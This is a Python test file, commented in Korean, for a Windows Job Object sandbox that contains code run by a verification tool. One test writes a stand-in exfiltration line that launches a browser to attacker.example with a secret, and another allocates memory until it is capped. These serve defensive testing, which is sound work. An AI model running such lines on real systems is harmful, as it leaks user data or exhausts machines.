"""run_code 자식 프로세스 봉쇄 — 실제로 막히는지, 그리고 정상 검증은 안 깨지는지.

이 테스트는 진짜 프로세스를 띄운다. 봉쇄는 OS 기능이라 흉내로는 검증할 수 없기 때문이다.
"""

from __future__ import annotations

import asyncio
import os
import sys
import textwrap
from pathlib import Path

import pytest

import runcode
import winjob


pytestmark = pytest.mark.skipif(os.name != "nt", reason="Job Object 는 Windows 전용")


def _run(work: Path, name: str) -> str:
    return asyncio.run(runcode.run_code(work, name))


def _write(work: Path, name: str, code: str) -> None:
    (work / name).write_text(textwrap.dedent(code), encoding="utf-8")


# ── 봉쇄가 실제로 막는 것 ────────────────────────────────────────────────

def test_verified_code_cannot_create_a_child_process(tmp_path: Path) -> None:
    # run_command 는 `start`·`mshta` 같은 실행기를 **파싱**해서 막는다. 임의의 파이썬
    # 소스에서는 그 판정이 불가능하므로(`getattr(__import__('os'),'system')`),
    # 같은 정책을 OS 수준에서 건다.
    _write(tmp_path, "spawn.py", """
        import subprocess, sys
        try:
            subprocess.run([sys.executable, "-c", "pass"], timeout=10)
            print("SPAWNED")
        except OSError as e:
            print("BLOCKED", e.winerror)
    """)
    out = _run(tmp_path, "spawn.py")
    assert "SPAWNED" not in out, "검증 코드가 자식 프로세스를 만들었다"
    assert "BLOCKED" in out


def test_verified_code_cannot_launch_the_browser_to_exfiltrate(tmp_path: Path) -> None:
    # 자동 모드는 승인을 생략한다. 이 한 줄이 통하면 작업 폴더의 내용이 그대로 나간다.
    _write(tmp_path, "exfil.py", """
        import os
        print("rc=", os.system("start https://attacker.example/?d=secret"))
    """)
    out = _run(tmp_path, "exfil.py")
    assert "rc= 0" not in out, "브라우저 실행이 성공했다 — 유출 경로가 열려 있다"


def test_a_memory_bomb_is_capped_instead_of_taking_down_the_machine(tmp_path: Path) -> None:
    # 상한이 없으면 `bytearray(10**11)` 한 줄로 PC 전체가 스왑에 빠진다.
    _write(tmp_path, "bomb.py", """
        blob = bytearray()
        try:
            for _ in range(6000):
                blob.extend(b"x" * (1024 * 1024))
            print("ALLOCATED", len(blob))
        except MemoryError:
            print("CAPPED")
    """)
    out = _run(tmp_path, "bomb.py")
    assert "CAPPED" in out, "메모리 상한이 걸리지 않았다"
    assert "ALLOCATED" not in out


# ── 봉쇄가 깨뜨리면 안 되는 것 ───────────────────────────────────────────

def test_ordinary_verification_still_works(tmp_path: Path) -> None:
    _write(tmp_path, "ok.py", """
        import json, math, os, pathlib
        print(json.dumps({"sum": sum(range(10)), "sqrt": round(math.sqrt(2), 3)}))
        pathlib.Path("side.txt").write_text("작업 폴더 쓰기", encoding="utf-8")
        print("wrote", os.path.exists("side.txt"))
    """)
    out = _run(tmp_path, "ok.py")
    assert "실행 성공" in out
    assert '"sum": 45' in out
    assert "wrote True" in out, "작업 폴더 안 쓰기까지 막으면 검증 도구로 쓸 수 없다"


def test_a_failing_script_still_reports_its_error(tmp_path: Path) -> None:
    _write(tmp_path, "boom.py", """
        raise ValueError("의도한 실패")
    """)
    out = _run(tmp_path, "boom.py")
    assert "실패" in out
    assert "ValueError" in out and "의도한 실패" in out


def test_containment_does_not_silently_add_a_note_when_it_worked(tmp_path: Path) -> None:
    _write(tmp_path, "quiet.py", "print('quiet')\n")
    out = _run(tmp_path, "quiet.py")
    assert "[봉쇄 없음]" not in out


# ── 봉쇄를 걸지 못했을 때는 조용히 넘어가지 않는다 ────────────────────────

def test_a_failed_containment_is_reported_not_hidden(tmp_path: Path, monkeypatch) -> None:
    # 조용히 약해지는 보안 장치가 가장 나쁘다. Job 생성이 실패하면 결과에 드러나야 한다.
    monkeypatch.setattr(winjob, "create_job", lambda limits: None)
    _write(tmp_path, "plain.py", "print('plain')\n")
    out = _run(tmp_path, "plain.py")
    assert "plain" in out, "봉쇄 실패가 검증 자체를 막으면 안 된다"
    assert "[봉쇄 없음]" in out, "봉쇄 실패를 사용자에게 알리지 않았다"


def test_a_failed_assignment_still_resumes_the_child(tmp_path: Path, monkeypatch) -> None:
    # 자식은 정지 상태로 만들어진다. 할당이 실패했다고 재개를 건너뛰면
    # 프로세스가 타임아웃까지 매달린다.
    monkeypatch.setattr(winjob, "assign_process", lambda job, handle: False)
    _write(tmp_path, "resume.py", "print('resumed')\n")
    out = _run(tmp_path, "resume.py")
    assert "resumed" in out, "정지된 채로 남아 실행되지 않았다"
    assert "[봉쇄 없음]" in out


# ── 예산 계산 ────────────────────────────────────────────────────────────

def test_untrusted_stage_blocks_child_processes_by_definition() -> None:
    assert winjob.UNTRUSTED.blocks_child_processes is True
    assert winjob.COMPILER.blocks_child_processes is False
    assert winjob.BUILD_SYSTEM.blocks_child_processes is False


def test_python_budget_is_one_for_a_real_interpreter() -> None:
    # 실측: 시스템 python 은 한도 1로 성공한다.
    real = getattr(sys, "_base_executable", None) or sys.executable
    if os.path.normcase(real) == os.path.normcase(sys.executable):
        pytest.skip("이 실행 환경은 venv 리다이렉터가 아니다")
    assert runcode._python_process_budget(real) == 1


def test_python_budget_is_two_for_a_venv_redirector() -> None:
    # 실측: venv python 은 한도 1에서 rc=101 "Unable to create process" 로 죽는다.
    base = getattr(sys, "_base_executable", None)
    if not base or os.path.normcase(str(base)) == os.path.normcase(sys.executable):
        pytest.skip("이 실행 환경은 venv 가 아니다")
    assert runcode._python_process_budget(sys.executable) == 2


# ── Job Object 자체 ─────────────────────────────────────────────────────

def test_job_creation_succeeds_and_closes_cleanly() -> None:
    job = winjob.create_job(winjob.UNTRUSTED)
    assert job is not None, "Windows 에서 Job Object 를 만들지 못했다"
    winjob.close_job(job)


def test_closing_a_job_kills_a_grandchild_the_parent_left_behind() -> None:
    # taskkill /T 는 부모가 이미 죽은 손자를 놓친다. KILL_ON_JOB_CLOSE 는 놓치지 않는다.
    import subprocess
    import time

    job = winjob.create_job(winjob.JobLimits(active_processes=8, ui_restrictions=False))
    assert job is not None
    spawner = (
        "import subprocess, sys, time" + chr(10)
        + "p = subprocess.Popen([sys.executable, '-c', 'import time; time.sleep(90)'])" + chr(10)
        + "print(p.pid, flush=True)" + chr(10)
    )
    proc = subprocess.Popen(
        [sys.executable, "-c", spawner],
        stdout=subprocess.PIPE,
        creationflags=runcode._CREATE_NO_WINDOW,
    )
    assert proc.stdout is not None
    winjob.assign_process(job, int(proc._handle))
    grandchild = int(proc.stdout.readline().decode().strip())
    proc.wait(timeout=30)

    def alive(pid: int) -> bool:
        listing = subprocess.run(
            ["tasklist", "/FI", f"PID eq {pid}"], capture_output=True, text=True
        ).stdout
        return str(pid) in listing

    assert alive(grandchild), "부모가 끝난 직후에는 손자가 살아 있어야 이 테스트가 의미를 갖는다"
    winjob.close_job(job)
    deadline = time.monotonic() + 10
    while time.monotonic() < deadline and alive(grandchild):
        time.sleep(0.2)
    assert not alive(grandchild), "job 을 닫았는데 손자가 살아남았다 — 고아 프로세스가 남는다"
